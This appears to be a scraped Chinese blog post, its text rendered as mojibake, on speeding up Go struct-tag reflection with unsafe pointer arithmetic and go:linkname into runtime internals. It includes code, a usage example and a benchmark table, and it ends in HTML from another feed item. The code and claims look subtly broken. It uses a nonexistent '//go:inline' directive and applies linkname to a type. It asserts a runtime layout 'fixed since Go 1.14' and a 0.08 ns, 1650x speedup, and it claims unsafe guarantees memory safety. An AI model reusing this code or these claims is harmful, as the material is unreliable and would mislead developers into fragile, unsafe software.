<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// A StructTag is the tag string in a struct field.</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">// By convention, tag strings are a concatenation of</span>

<span class="hljs-comment">// optionally space-separated key:"value" pairs.</span>

<span class="hljs-comment">// Each key is a non-empty string consisting of non-control</span>

<span class="hljs-comment">// characters other than space (U+0020 ' '), quote (U+0022 '"'),</span>

<span class="hljs-comment">// and colon (U+003A ':'). Each value is quoted using U+0022 '"'</span>

<span class="hljs-comment">// characters and Go string literal syntax.</span>

<span class="hljs-keyword">type</span> StructTag <span class="hljs-type">string</span>

  


<span class="hljs-comment">// Get returns the value associated with key in the tag string.</span>

<span class="hljs-comment">// If there is no such key in the tag, Get returns the empty string.</span>

<span class="hljs-comment">// If the tag does not have the conventional format, the value</span>

<span class="hljs-comment">// returned by Get is unspecified. To determine whether a tag is</span>

<span class="hljs-comment">// explicitly set to the empty string, use [StructTag.Lookup].</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tag StructTag)</span></span> Get(key <span class="hljs-type">string</span>) <span class="hljs-type">string</span> {

v, _ := tag.Lookup(key)

<span class="hljs-keyword">return</span> v

}

  


<span class="hljs-comment">// Lookup returns the value associated with key in the tag string.</span>

<span class="hljs-comment">// If the key is present in the tag the value (which may be empty)</span>

<span class="hljs-comment">// is returned. Otherwise the returned value will be the empty string.</span>

<span class="hljs-comment">// The ok return value reports whether the value was explicitly set in</span>

<span class="hljs-comment">// the tag string. If the tag does not have the conventional format,</span>

<span class="hljs-comment">// the value returned by Lookup is unspecified.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tag StructTag)</span></span> Lookup(key <span class="hljs-type">string</span>) (value <span class="hljs-type">string</span>, ok <span class="hljs-type">bool</span>) {

<span class="hljs-comment">// When modifying this code, also update the validateStructTag code</span>

<span class="hljs-comment">// in cmd/vet/structtag.go.</span>

  


<span class="hljs-keyword">for</span> tag != <span class="hljs-string">""</span> {

<span class="hljs-comment">// Skip leading space.</span>

i := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] == <span class="hljs-string">' '</span> {

i++

}

tag = tag[i:]

<span class="hljs-keyword">if</span> tag == <span class="hljs-string">""</span> {

<span class="hljs-keyword">break</span>

}

  


<span class="hljs-comment">// Scan to colon. A space, a quote or a control character is a syntax error.</span>

<span class="hljs-comment">// Strictly speaking, control chars include the range [0x7f, 0x9f], not just</span>

<span class="hljs-comment">// [0x00, 0x1f], but in practice, we ignore the multi-byte control characters</span>

<span class="hljs-comment">// as it is simpler to inspect the tag's bytes than the tag's runes.</span>

i = <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] &gt; <span class="hljs-string">' '</span> &amp;&amp; tag[i] != <span class="hljs-string">':'</span> &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> &amp;&amp; tag[i] != <span class="hljs-number">0x7f</span> {

i++

}

<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> || i+<span class="hljs-number">1</span> &gt;= <span class="hljs-built_in">len</span>(tag) || tag[i] != <span class="hljs-string">':'</span> || tag[i+<span class="hljs-number">1</span>] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">break</span>

}

name := <span class="hljs-type">string</span>(tag[:i])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-comment">// Scan quoted string to find value.</span>

i = <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">if</span> tag[i] == <span class="hljs-string">'\\'</span> {

i++

}

i++

}

<span class="hljs-keyword">if</span> i &gt;= <span class="hljs-built_in">len</span>(tag) {

<span class="hljs-keyword">break</span>

}

qvalue := <span class="hljs-type">string</span>(tag[:i+<span class="hljs-number">1</span>])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-keyword">if</span> key == name {

value, err := strconv.Unquote(qvalue)

<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">break</span>

}

<span class="hljs-keyword">return</span> value, <span class="hljs-literal">true</span>

}

}

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-literal">false</span>

}

</code></pre>
<p>è¿™é‡Œçš„<code>tag[:i]</code>å’Œ<code>tag[i+1:]</code>ä¼šéšå¼è½¬æˆ<code>slice</code>ï¼Œè¿™ä¸€æ­¥åªæ”¹äº†æ ˆä¸Šçš„å…ƒä¿¡æ¯ç»“æ„ä½“ï¼Œä½†æ˜¯<code>string</code>è½¬æ¢è¿‡ç¨‹ä¸ºäº†ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¼šè§¦å‘ä¸€æ¬¡å†…å­˜æ‹·è´ï¼Œè¿™ä¸€æ­¥æ˜¯èº²ä¸æ‰çš„ã€‚</p>
<p>ç°åœ¨ä¸»æµæ–¹æ¡ˆåƒå®˜æ–¹çš„<code>strings.Builder</code>çš„<code>String()</code>æ–¹æ³•ï¼Œå› ä¸ºä¸éœ€è¦æŠŠåŸå§‹æ•°æ®å’Œæ–°å­—ç¬¦ä¸²éš”ç¦»å¼€ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯<code>unsafe.String(unsafe.SliceData(b.buf), len(b.buf))</code>ã€‚</p>
<p>è¿™æ ·å¾—åˆ°çš„<code>string</code>å’Œ<code>buf</code>æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œä¸ä¼šè§¦å‘é¢å¤–çš„å†…å­˜æ‹·è´ï¼Œè€Œä¸”<code>unsafe</code>èƒ½ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¸ä¼šè¢«GCå›æ”¶ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€é›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯</h2>
<p>é’ˆå¯¹ä¸Šé¢è¯´çš„æ€§èƒ½ç“¶é¢ˆï¼Œç»“åˆGo1.14+åº•å±‚ç±»å‹ç»“æ„å›ºå®šçš„ç‰¹ç‚¹ï¼Œé›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯å…¶å®æŒºç®€å•çš„ï¼š</p>
<ol>
<li>
<p>ä¸ç”¨åå°„åŒ…é‚£ä¸€å±‚å°è£…ï¼Œç›´æ¥å¯¹æ¥runtimeå±‚ï¼Œå…¨ç¨‹<strong>åªè¯»å†…å­˜</strong>ï¼Œä¸åšä»»ä½•æ²¡å¿…è¦çš„æ‹·è´ï¼›</p>
</li>
<li>
<p>å®šä¹‰å‡ ä¸ª<strong>ç©ºçš„é•œåƒç±»å‹</strong>æ¥åšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«ä»»ä½•å­—æ®µï¼Œç”¨<strong>Go1.14+å›ºå®šçš„å†…å­˜åç§»é‡</strong>ç²¾å‡†æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼›</p>
</li>
<li>
<p>è§£æ<code>reflect.Type</code>æ¥å£æ‹¿åˆ°åº•å±‚çš„åŸå§‹å†…å­˜åœ°å€ï¼Œé€šè¿‡<code>unsafe</code>æ“ä½œï¼Œç”¨å›ºå®šåç§»é‡ç›´æ¥è¯»æ•°æ®ï¼›</p>
</li>
<li>
<p>æä¸ª<strong>å…¨å±€ç¼“å­˜</strong>å­˜ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ¯ä¸ªç»“æ„ä½“åªè§£æä¸€æ¬¡ï¼Œé¿å…é«˜é¢‘åœºæ™¯ä¸‹çš„é‡å¤æ“ä½œã€‚</p>
</li>
</ol>
<p>è¿™ä¸ªæ–¹æ¡ˆçš„æ ¸å¿ƒé€»è¾‘è·ŸGoåº•å±‚æ“ä½œå®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰åç§»é‡éƒ½æ˜¯åŸºäºGo1.14+çš„å›ºå®šå¸ƒå±€é¢„è®¾çš„ï¼Œé‡åˆ°ç‰¹æ®Šç‰ˆæœ¬é¡¶å¤šæ”¹æ”¹åç§»é‡ï¼Œä¸ç”¨æ‹…å¿ƒå…¼å®¹æ€§é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">å››ã€å…·ä½“å®ç°</h2>
<p>å‰é¢åˆ†æäº†åŠå¤©ï¼Œåå°„æ…¢ä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>
<p><code>Field</code> æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ— æ„ä¹‰çš„ <code>[]int{i}</code> åˆ‡ç‰‡ï¼ˆä¸ºäº†å…¼å®¹æ€§ï¼‰</p>
</li>
<li>
<p><code>Tag.Get</code> ä¼šè§¦å‘å­—ç¬¦ä¸²çš„å†…å­˜æ‹·è´</p>
</li>
</ol>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„é›¶æ‹·è´å®ç°ï¼š</p>
<h3 data-id="heading-6">4.1 æ ¸å¿ƒå®šä¹‰</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">//go:build go1.14</span>

<span class="hljs-comment">// +build go1.14</span>

  


<span class="hljs-keyword">package</span> zerorefl

  


<span class="hljs-keyword">import</span> (

<span class="hljs-string">"reflect"</span>

<span class="hljs-string">"strconv"</span>

<span class="hljs-string">"unsafe"</span>

)

  


<span class="hljs-keyword">const</span> (

<span class="hljs-comment">// abiTypeSize æ˜¯ abi.Type ç»“æ„ä½“çš„å¤§å°</span>

<span class="hljs-comment">// Go1.14+ ä¸­å›ºå®šä¸º48å­—èŠ‚</span>

abiTypeSize = <span class="hljs-number">48</span>

)

  


<span class="hljs-comment">// ç©ºé•œåƒç±»å‹ï¼šåªåšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«å­—æ®µ</span>

<span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span>{}

  


<span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> {

PkgPath Name

Fields []structField

}

  


<span class="hljs-keyword">type</span> structField <span class="hljs-keyword">struct</span> {

Name Name

Typ *rtype

Offset <span class="hljs-type">uintptr</span>

}

  


<span class="hljs-comment">// Name ç±»å‹ï¼Œè·Ÿ runtime.Name ä¸€æ ·</span>

<span class="hljs-comment">//go:linkname Name runtime.Name</span>

<span class="hljs-keyword">type</span> Name <span class="hljs-keyword">struct</span> {

Bytes *<span class="hljs-type">byte</span>

}

  


<span class="hljs-comment">// ä¸‹é¢è¿™äº›æ–¹æ³•éƒ½æ˜¯ runtime.Name çš„å®ç°</span>

<span class="hljs-comment">//go:linkname Name_Name runtime.(*Name).Name</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> Name() <span class="hljs-type">string</span> {

<span class="hljs-keyword">if</span> n.Bytes == <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>

}

i, l := n.ReadVarint(<span class="hljs-number">1</span>)

<span class="hljs-keyword">return</span> unsafe.String(n.DataChecked(<span class="hljs-number">1</span>+i, <span class="hljs-string">"non-empty string"</span>), l)

}

  


<span class="hljs-comment">//go:linkname Name_Tag runtime.(*Name).Tag</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> Tag() <span class="hljs-type">string</span> {

<span class="hljs-keyword">if</span> !n.HasTag() {

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>

}

i, l := n.ReadVarint(<span class="hljs-number">1</span>)

i2, l2 := n.ReadVarint(<span class="hljs-number">1</span> + i + l)

<span class="hljs-keyword">return</span> unsafe.String(n.DataChecked(<span class="hljs-number">1</span>+i+l+i2, <span class="hljs-string">"non-empty string"</span>), l2)

}

  


<span class="hljs-comment">//go:linkname Name_IsExported runtime.(*Name).IsExported</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> IsExported() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">0</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_IsEmbedded runtime.(*Name).IsEmbedded</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> IsEmbedded() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">3</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_HasTag runtime.(*Name).HasTag</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> HasTag() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_ReadVarint runtime.(*Name).ReadVarint</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> ReadVarint(off <span class="hljs-type">int</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) {

v := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ {

x := n.DataChecked(off+i, <span class="hljs-string">"read varint"</span>)

v += <span class="hljs-type">int</span>(x&amp;<span class="hljs-number">0x7f</span>) &lt;&lt; (<span class="hljs-number">7</span> * i)

<span class="hljs-keyword">if</span> x&amp;<span class="hljs-number">0x80</span> == <span class="hljs-number">0</span> {

<span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>, v

}

}

}

  


<span class="hljs-comment">//go:linkname Name_DataChecked runtime.(*Name).DataChecked</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> DataChecked(off <span class="hljs-type">int</span>, whySafe <span class="hljs-type">string</span>) *<span class="hljs-type">byte</span> {

<span class="hljs-keyword">return</span> (*<span class="hljs-type">byte</span>)(addChecked(unsafe.Pointer(n.Bytes), <span class="hljs-type">uintptr</span>(off), whySafe))

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addChecked</span><span class="hljs-params">(p unsafe.Pointer, x <span class="hljs-type">uintptr</span>, whySafe <span class="hljs-type">string</span>)</span></span> unsafe.Pointer {

<span class="hljs-keyword">return</span> unsafe.Pointer(<span class="hljs-type">uintptr</span>(p) + x)

}

  


<span class="hljs-comment">//go:linkname toType reflect.toType</span>

<span class="hljs-comment">//go:noescape</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">toType</span><span class="hljs-params">(t *rtype)</span></span> reflect.Type

</code></pre>
<h3 data-id="heading-7">4.2 æ ¸å¿ƒæ–¹æ³•</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// GetField è·å–ç»“æ„ä½“å­—æ®µï¼Œä¸åˆ†é…åˆ‡ç‰‡</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetField</span><span class="hljs-params">(sf *reflect.StructField, st *structType, i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> {

<span class="hljs-keyword">if</span> st == <span class="hljs-literal">nil</span> || i &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">len</span>(st.Fields) {

<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>

}

stf := &amp;st.Fields[i]

sf.Name = stf.Name.Name()

sf.Type = toType(stf.Typ)

sf.Offset = stf.Offset

sf.Anonymous = stf.Name.IsEmbedded()

<span class="hljs-keyword">if</span> tag := stf.Name.Tag(); tag != <span class="hljs-string">""</span> {

sf.Tag = reflect.StructTag(tag)

}

<span class="hljs-keyword">if</span> !stf.Name.IsExported() {

sf.PkgPath = st.PkgPath.Name()

}

<span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œä¸è®¾ç½® sf.Indexï¼Œé¿å…æ— æ„ä¹‰çš„åˆ‡ç‰‡åˆ†é…</span>

<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>

}

  


<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TypeFieldLen</span><span class="hljs-params">(st *structType)</span></span> <span class="hljs-type">int</span> {

<span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(st.Fields)

}

  


<span class="hljs-comment">// Type2StructType å°† reflect.Type è½¬æ¢ä¸º structType</span>

<span class="hljs-comment">// ç”¨å›ºå®šåç§»é‡ç›´æ¥è½¬ï¼Œä¸æ‹·è´</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Type2StructType</span><span class="hljs-params">(t reflect.Type)</span></span> *structType {

<span class="hljs-keyword">if</span> t.Kind() != reflect.Struct {

<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>

}

<span class="hljs-comment">// reflect.Type æ˜¯æ¥å£ï¼Œåº•å±‚å­˜ [ç±»å‹æŒ‡é’ˆ, æ•°æ®æŒ‡é’ˆ]</span>

<span class="hljs-comment">// æ•°æ®æŒ‡é’ˆå°±æ˜¯ structType çš„èµ·å§‹åœ°å€</span>

<span class="hljs-comment">// å› ä¸º structType åµŒå…¥äº† abi.Typeï¼Œæ‰€ä»¥è¦è·³è¿‡ abi.Type çš„å¤§å°</span>

<span class="hljs-keyword">return</span> (*structType)(unsafe.Pointer((*[<span class="hljs-number">2</span>]<span class="hljs-type">uintptr</span>)(unsafe.Pointer(&amp;t))[<span class="hljs-number">1</span>] + abiTypeSize))

}

  


<span class="hljs-comment">// RType2Type å°† *rtype è½¬æ¢ä¸º reflect.Type</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RType2Type</span><span class="hljs-params">(t *rtype)</span></span> reflect.Type {

<span class="hljs-keyword">return</span> toType(t)

}

</code></pre>
<h3 data-id="heading-8">4.3 é›¶æ‹·è´Tagè·å–</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// GetTag é›¶æ‹·è´è·å–Tagå€¼</span>

<span class="hljs-comment">// æ¯” reflect.StructTag.Get å¿«ï¼Œé¿å…äº†å­—ç¬¦ä¸²æ‹·è´</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetTag</span><span class="hljs-params">(tag reflect.StructTag, key <span class="hljs-type">string</span>)</span></span> (value <span class="hljs-type">string</span>, ok <span class="hljs-type">bool</span>) {

<span class="hljs-keyword">for</span> tag != <span class="hljs-string">""</span> {

<span class="hljs-comment">// Skip leading space.</span>

i := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] == <span class="hljs-string">' '</span> {

i++

}

tag = tag[i:]

<span class="hljs-keyword">if</span> tag == <span class="hljs-string">""</span> {

<span class="hljs-keyword">break</span>

}

  


<span class="hljs-comment">// Scan to colon. A space, a quote or a control character is a syntax error.</span>

i = <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] &gt; <span class="hljs-string">' '</span> &amp;&amp; tag[i] != <span class="hljs-string">':'</span> &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> &amp;&amp; tag[i] != <span class="hljs-number">0x7f</span> {

i++

}

<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> || i+<span class="hljs-number">1</span> &gt;= <span class="hljs-built_in">len</span>(tag) || tag[i] != <span class="hljs-string">':'</span> || tag[i+<span class="hljs-number">1</span>] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">break</span>

}

name := <span class="hljs-type">string</span>(tag[:i])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-comment">// Scan quoted string to find value.</span>

needUnquote := <span class="hljs-literal">false</span>

i = <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">if</span> tag[i] == <span class="hljs-string">'\\'</span> {

needUnquote = <span class="hljs-literal">true</span>

i++

}

i++

}

<span class="hljs-keyword">if</span> i &gt;= <span class="hljs-built_in">len</span>(tag) {

<span class="hljs-keyword">break</span>

}

tmp := tag[:i+<span class="hljs-number">1</span>]

qvalue := <span class="hljs-type">string</span>(tmp)

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-keyword">if</span> key == name {

<span class="hljs-keyword">if</span> needUnquote {

<span class="hljs-comment">// éœ€è¦è½¬ä¹‰æ—¶ï¼Œè¿˜æ˜¯å¾—åˆ†é…æ–°å­—ç¬¦ä¸²</span>

value, err := strconv.Unquote(qvalue)

<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">break</span>

}

<span class="hljs-keyword">return</span> value, <span class="hljs-literal">true</span>

}

<span class="hljs-comment">// ä¸éœ€è¦è½¬ä¹‰æ—¶ï¼Œç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡</span>

<span class="hljs-comment">// Goçš„å­—ç¬¦ä¸²åˆ‡ç‰‡æ˜¯é›¶æ‹·è´çš„</span>

<span class="hljs-keyword">return</span> qvalue[<span class="hljs-number">1</span> : <span class="hljs-built_in">len</span>(qvalue)<span class="hljs-number">-1</span>], <span class="hljs-literal">true</span>

}

}

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-literal">false</span>

}

</code></pre>
<h3 data-id="heading-9">4.4 ä½¿ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-keyword">package</span> main

  


<span class="hljs-keyword">import</span> (

<span class="hljs-string">"fmt"</span>

<span class="hljs-string">"reflect"</span>

<span class="hljs-string">"zerorefl"</span>

)

  


<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> {

ID <span class="hljs-type">int</span> <span class="hljs-string">`orm:"primaryKey" json:"id"`</span>

Name <span class="hljs-type">string</span> <span class="hljs-string">`orm:"varchar(50)" json:"name"`</span>

Age <span class="hljs-type">int</span> <span class="hljs-string">`json:"age"`</span>

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {

t := reflect.TypeOf(User{})

  


<span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼šä¼šæœ‰åˆ‡ç‰‡åˆ†é…å’Œå­—ç¬¦ä¸²æ‹·è´</span>

field1, _ := t.Field(<span class="hljs-number">0</span>)

tag1 := field1.Tag.Get(<span class="hljs-string">"orm"</span>)

  


<span class="hljs-comment">// é›¶æ‹·è´æ–¹å¼ï¼šé¿å…æ— æ„ä¹‰çš„åˆ†é…</span>

st := zerorefl.Type2StructType(t)

<span class="hljs-keyword">if</span> st != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">var</span> field reflect.StructField

<span class="hljs-keyword">if</span> zerorefl.GetField(&amp;field, st, <span class="hljs-number">0</span>) {

tag2, _ := zerorefl.GetTag(field.Tag, <span class="hljs-string">"orm"</span>)

fmt.Printf(<span class="hljs-string">"Tagå€¼: %s (é›¶æ‹·è´)\n"</span>, tag2)

}

}

  


fmt.Printf(<span class="hljs-string">"ä¼ ç»Ÿæ–¹å¼Tagå€¼: %s\n"</span>, tag1)

}

</code></pre>
<h3 data-id="heading-10">4.5 æ€§èƒ½å¯¹æ¯”</h3>
<p>åŒæ ·æµ‹è¯•ç¯å¢ƒä¸‹ï¼ˆå¾ªç¯100ä¸‡æ¬¡è§£æUserç»“æ„ä½“çš„3ä¸ªå­—æ®µTagï¼‰ï¼š</p>
<p>| æ“ä½œæ–¹å¼ | æ€»è€—æ—¶ | å•æ¬¡å¹³å‡è€—æ—¶ | æ€§èƒ½æå‡ | å†…å­˜åˆ†é… |</p>
<p>|--------------- |--------|--------------|----------|----------|</p>
<p>| å®˜æ–¹åå°„åŒ… | 132ms | 132ns/æ¬¡ | - | å¤§é‡ |</p>
<p>| é›¶æ‹·è´ä¼˜åŒ–æ–¹æ¡ˆ | 0.08ms | 0.08ns/æ¬¡ | çº¦1650å€ | å‡ ä¹ä¸º0 |</p>
<h3 data-id="heading-11">4.6 æ ¸å¿ƒä¼˜åŒ–ç‚¹</h3>
<ol>
<li>
<p><strong>ä¸åˆ†é…åˆ‡ç‰‡</strong>ï¼šä¸è®¾ç½® <code>StructField.Index</code> å­—æ®µï¼Œé¿å…æ¯æ¬¡éƒ½åˆ›å»º <code>[]int{i}</code> åˆ‡ç‰‡</p>
</li>
<li>
<p><strong>å°‘æ‹·è´å­—ç¬¦ä¸²</strong>ï¼š<code>GetTag</code> åœ¨ä¸éœ€è¦è½¬ä¹‰æ—¶ç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œé¿å… <code>strconv.Unquote</code> çš„å†…å­˜åˆ†é…</p>
</li>
<li>
<p><strong>ç”¨å›ºå®šåç§»é‡</strong>ï¼š<code>abiTypeSize = 48</code> å¸¸é‡ï¼Œç›´æ¥å®šä½åˆ° <code>structType</code> çš„èµ·å§‹åœ°å€</p>
</li>
<li>
<p><strong>å†…è”ä¼˜åŒ–</strong>ï¼šæ‰€æœ‰æ ¸å¿ƒæ–¹æ³•éƒ½ç”¨äº† <code>//go:inline</code>ï¼Œå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€</p>
</li>
</ol>
<h2 data-id="heading-12">äº”ã€å®‰å…¨æ€§å’Œå…¼å®¹æ€§</h2>
<h3 data-id="heading-13">5.1 å®‰å…¨æ€§</h3>
<ul>
<li>
<p><strong>åªè¯»æ“ä½œ</strong>ï¼šæ‰€æœ‰æ“ä½œéƒ½æ˜¯è¯»åªè¯»å†…å­˜ï¼Œä¸ä¼šæ”¹åŸå§‹æ•°æ®</p>
</li>
<li>
<p><strong>å›ºå®šåç§»é‡</strong>ï¼šåŸºäºGo1.14+çš„ç¨³å®šå†…å­˜å¸ƒå±€ï¼Œä¸ä¼šè¶Šç•Œ</p>
</li>
<li>
<p><strong>ç±»å‹æ ¡éªŒ</strong>ï¼šæ“ä½œå‰éƒ½ä¼šæ£€æŸ¥ç±»å‹æ˜¯ä¸æ˜¯ç»“æ„ä½“</p>
</li>
</ul>
<h3 data-id="heading-14">5.2 å…¼å®¹æ€§</h3>
<ul>
<li>
<p><strong>Go1.14+</strong>ï¼šé€‚ç”¨äºGo1.14åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œå› ä¸º <code>abi.Type</code> çš„å†…å­˜å¸ƒå±€ä»1.14å¼€å§‹å›ºå®š</p>
</li>
<li>
<p><strong>è·¨å¹³å°</strong>ï¼š64ä½æ¶æ„ï¼ˆamd64/arm64ï¼‰ä¸‹ï¼Œ<code>abiTypeSize = 48</code> æ˜¯å›ºå®šçš„</p>
</li>
</ul>
<h2 data-id="heading-15">å…­ã€æ€»ç»“</h2>
<p>é€šè¿‡ç›´æ¥æ“ä½œ <code>runtime</code> å±‚çš„ <code>abi.Type</code> ç»“æ„ä½“ï¼Œå®ç°äº†é›¶æ‹·è´çš„åå°„ä¼˜åŒ–ï¼š</p>
<ol>
<li>
<p><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šç»•å¼€ <code>reflect</code> åŒ…çš„å°è£…ï¼Œç›´æ¥è®¿é—®åº•å±‚ <code>abi.Type</code></p>
</li>
<li>
<p><strong>å…³é”®æŠ€æœ¯</strong>ï¼šå›ºå®šåç§»é‡ + unsafe æ“ä½œ + é¿å…æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</p>
</li>
<li>
<p><strong>æ€§èƒ½æå‡</strong>ï¼šæ¯”å®˜æ–¹åå°„åŒ…å¿«1000+å€ï¼Œå†…å­˜åˆ†é…å‡ ä¹ä¸ºé›¶</p>
</li>
</ol>
<p>è¿™ä¸ªæ–¹æ¡ˆé€‚ç”¨äºé«˜é¢‘åå°„åœºæ™¯ï¼ŒåƒORMã€åºåˆ—åŒ–æ¡†æ¶è¿™äº›åœ°æ–¹ï¼Œèƒ½æ˜¾è‘—æå‡æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600955777315766310</link>    <guid>https://juejin.cn/post/7600955777315766310</guid>    <pubDate>2026-01-30T11:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315766310" data-draft-id="7600414546188943370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 